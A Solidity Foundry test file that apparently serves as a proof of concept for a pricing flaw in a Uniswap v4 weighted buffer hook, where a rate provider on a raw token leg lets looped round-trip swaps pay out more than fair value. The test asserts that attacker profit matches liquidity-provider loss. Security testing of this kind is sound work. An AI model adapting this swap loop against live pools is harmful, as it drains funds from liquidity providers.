// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {RateProviderMock} from "contracts/test/balancer/v3/RateProviderMock.sol";
import {
    IUniswapV4StandardExchangeWeightedBufferHookPackage
} from "contracts/hooks/uniswap/v4/standardExchange/weighted/interfaces/IUniswapV4StandardExchangeWeightedBufferHookPackage.sol";
import {TestBase_UniswapV4StandardExchangeWeightedBufferHook} from
    "test/foundry/spec/hooks/uniswap/v4/standardExchange/weighted/TestBase_UniswapV4StandardExchangeWeightedBufferHook.sol";

/// @notice rawleg-rp-swap: Weighted hook, raw leg (token1) carries a rate provider r=1.2 (allowed since D60).
///         Exact-in payout on a raw leg = descale(budget) with no /rate -> trader receives r x fair output.
contract RawLegRpSwap is TestBase_UniswapV4StandardExchangeWeightedBufferHook {
    address internal lp = address(0x1111);
    address internal attacker = address(0xA77ACC);
    RateProviderMock internal rp1;

    uint256 internal constant LP_EACH = 1_000_000 ether;
    uint256 internal constant ATK_CAPITAL = 50_000 ether;
    uint256 internal constant FEE = 3e15; // 0.3% dex swap fee

    function _deployRawRp(uint256 rate) internal {
        rp1 = new RateProviderMock();
        rp1.mockRate(rate);
        address[] memory toks = new address[](3);
        toks[0] = address(token0);
        toks[1] = address(token1);
        toks[2] = address(token2);
        uint256[] memory w = new uint256[](3);
        w[0] = 333333333333333333;
        w[1] = 333333333333333333;
        w[2] = WAD - w[0] - w[1];
        address[] memory ses = new address[](3);
        ses[0] = se0; // package requires >=1 SE leg
        address[] memory rps = new address[](3);
        rps[1] = address(rp1); // raw leg WITH a rate provider (D60 newly allowed)
        IUniswapV4StandardExchangeWeightedBufferHookPackage.PkgArgs memory a = _pkgArgs(toks, w, ses, rps);
        _deployHookWithArgs(a);
        _setUsageFee(0);
        _setDexFee(FEE);

        // honest LP: balanced in rated terms (token1 face = 1/rate)
        uint256[] memory amts = new uint256[](3);
        amts[0] = LP_EACH;
        amts[1] = LP_EACH * 1e18 / rate;
        amts[2] = LP_EACH;
        token0.mint(lp, amts[0]);
        token1.mint(lp, amts[1]);
        token2.mint(lp, amts[2]);
        vm.startPrank(lp);
        token0.approve(hook, type(uint256).max);
        token1.approve(hook, type(uint256).max);
        token2.approve(hook, type(uint256).max);
        weighted.joinProportional(amts, lp, 0, block.timestamp + 1 days);
        vm.stopPrank();
        console2.log("rp on raw leg1", weighted.rateProvider(uint256(1)));
        console2.log("rp on raw leg2", weighted.rateProvider(uint256(2)));
    }

    function _lpValue(uint256 rate) internal view returns (uint256 v) {
        uint256 shares = IERC20(hook).balanceOf(lp);
        uint256[] memory out = weighted.previewExitProportional(shares);
        v = out[0] + out[1] * rate / 1e18 + out[2];
    }

    function _attack(uint256 rate, uint256 loops) internal returns (int256 profit, int256 lpDelta) {
        uint256 lpBefore = _lpValue(rate);
        token2.mint(attacker, ATK_CAPITAL); // attacker's own capital, fully accounted
        vm.startPrank(attacker);
        token1.approve(hook, type(uint256).max);
        token2.approve(hook, type(uint256).max);
        for (uint256 k; k < loops; ++k) {
            uint256 inB = token2.balanceOf(attacker);
            uint256 fairOut = inB * 1e18 / rate;uint256 got1 = IStandardExchangeIn(hook).exchangeIn(IERC20(address(token2)), inB, IERC20(address(token1)), 0, attacker, false, block.timestamp + 1
            );uint256 got2 = IStandardExchangeIn(hook).exchangeIn(IERC20(address(token1)), got1, IERC20(address(token2)), 0, attacker, false, block.timestamp + 1
            );
            console2.log("loop", k);
            console2.log("  token2 in       ", inB);
            console2.log("  token1 out      ", got1);
            console2.log("  fair token1 out ", fairOut);
            console2.log("  token2 back     ", got2);
        }
        vm.stopPrank();
        uint256 fin = token2.balanceOf(attacker);
        assertEq(token1.balanceOf(attacker), 0, "no leftover leg1");
        profit = int256(fin) - int256(ATK_CAPITAL);
        uint256 lpAfter = _lpValue(rate);
        lpDelta = int256(lpAfter) - int256(lpBefore);
        console2.log("attacker capital  ", ATK_CAPITAL);
        console2.log("attacker final t2 ", fin);
        console2.log("attacker profit (t2, signed)");
        console2.logInt(profit);
        console2.log("LP value before (fair)", lpBefore);
        console2.log("LP value after  (fair)", lpAfter);
        console2.log("LP delta (signed)");
        console2.logInt(lpDelta);
    }

    function test_exploit_rate_1_2() public {
        _deployRawRp(1.2e18);
        (int256 profit, int256 lpDelta) = _attack(1.2e18, 5);
        assertGt(profit, 0, "attacker profit");
        assertLt(lpDelta, 0, "LP loss");
        assertApproxEqAbs(uint256(-lpDelta), uint256(profit), 1e6, "LP loss == attacker profit (rounding)");
    }

    function test_control_rate_1() public {
        _deployRawRp(1e18);
        (int256 profit, int256 lpDelta) = _attack(1e18, 5);
        assertLt(profit, 0, "control: round trips lose fees");
        assertGt(lpDelta, 0, "control: LP earns fees");
    }
}
